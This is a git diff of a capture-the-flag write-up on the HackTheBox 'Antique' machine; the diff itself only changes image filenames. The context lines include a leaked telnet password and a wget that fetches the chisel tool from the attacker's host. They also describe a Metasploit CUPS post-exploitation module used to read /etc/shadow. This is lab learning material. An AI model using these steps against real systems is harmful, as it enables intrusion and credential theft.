@@ -16,7 +16,7 @@ A basic nmap scan shows that only telnet is online:
 
 Trying to telnet into the system, it asks for a password:
 
-![](<../../.gitbook/assets/image (348) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (348) (1) (1) (1) (1) (1) (1) (1).png>)
 
 I also had a deeper nmap scan running: `nmap -A -T4 -p- 10.10.11.107 -oN antique.nmap`
 
@@ -78,7 +78,7 @@ I had actually had found the password for telnet on my own, but I was unable to 
 
 I use **snmpget**, while the walk-through used **snmpwalk**. In the walk-through they used **binascii** (python import) in order to decode the bytes. I wanted to find a solution that was a bit more basic. I ended up using [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) to convert the bytes from hex to ascii:
 
-![](<../../.gitbook/assets/image (346) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (346) (1) (1) (1) (1) (1) (1) (1).png>)
 
 The password seems to be: **P@ssw0rd@123!!123** I was in!
 
@@ -92,7 +92,7 @@ I noticed the write-up use python for the reverse shell. I then used [https://gi
 
 ![](<../../.gitbook/assets/image (349) (1) (1) (1) (1) (1).png>)
 
-![](<../../.gitbook/assets/image (350) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (350) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 I viewed the walk-through again to see what I missed. The walk-through author runs the netstat command to see what connections are there:
 
@@ -100,11 +100,11 @@ I viewed the walk-through again to see what I missed. The walk-through author ru
 
 They then go on to say that we should use **chisel** to connect to the port. I ran into an issue here where I was unable to download a GitHub repository onto the machine itself. I then realize that you make the binary locally and then upload it to the server. I uploaded the file to the machine by running `python3 -m http.server` on the folder where chisel was downloaded. I was then able to upload it by running `wget http://10.10.14.10:8000/chisel` on the remote machine. When I uploaded the file, I was unable to run it due to some dependency error in terms of version of libc:
 
-![](<../../.gitbook/assets/image (351) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (351) (1) (1) (1) (1) (1) (1).png>)
 
 &#x20;I then followed [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/) to see what I missed and what I could have done instead. They run `wget localhost:631`, which makes a file called **index.html** in the folder you are in. There, you can see that CUPS is mentioned:
 
-![](<../../.gitbook/assets/image (339) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (339) (1) (1) (1) (1) (1) (1).png>)
 
 When we search for cups on metasploit we get the following:
 
@@ -122,7 +122,7 @@ run
 
 After I ran the **run** command, I then switched to the remote machine and ran the shell executable (run `chmod +x shell` to make it executable). This gave me a connection in Metasploit:
 
-![](<../../.gitbook/assets/image (347) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (347) (1) (1) (1) (1) (1) (1) (1).png>)
 
 I then ran the following commands to look for the cups post exploitation program:
 
@@ -130,7 +130,7 @@ I then ran the following commands to look for the cups post exploitation program
 
 I then hit run and got an output:
 
-![](<../../.gitbook/assets/image (344) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (344) (1) (1) (1) (1) (1) (1).png>)
 
 Opening that file shows the output of /etc/shadow:
 
